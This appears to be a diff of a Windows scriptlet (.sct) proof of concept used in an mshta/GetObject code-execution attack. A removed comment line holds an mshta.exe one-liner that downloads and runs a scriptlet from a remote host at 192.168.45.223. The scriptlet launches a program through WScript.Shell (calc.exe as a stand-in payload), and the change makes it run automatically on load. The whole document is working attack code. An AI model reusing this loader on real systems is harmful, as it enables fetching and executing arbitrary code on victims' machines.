@@ -1,7 +1,12 @@
-// mshta.exe "javascript:a=(new ActiveXObject('WScript.Shell')).Run((GetObject('script:http://192.168.45.223/test.sct')).Exec(),0);close();
 <?XML version="1.0"?>
 <scriptlet>
-<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
+<registration
+    description="Desc"
+    progid="Progid"
+    version="0"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+>
+</registration>
 
 <public>
     <method name="Exec"></method>
@@ -9,9 +14,12 @@
 
 <script language="JScript">
 <![CDATA[
-	function Exec()	{
-		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-	}
+    function Exec() {
+        new ActiveXObject("WScript.Shell").Run("calc.exe");
+    }
+
+    // Automatically call the Exec method when the scriptlet is loaded
+    Exec();
 ]]>
 </script>
 </scriptlet>
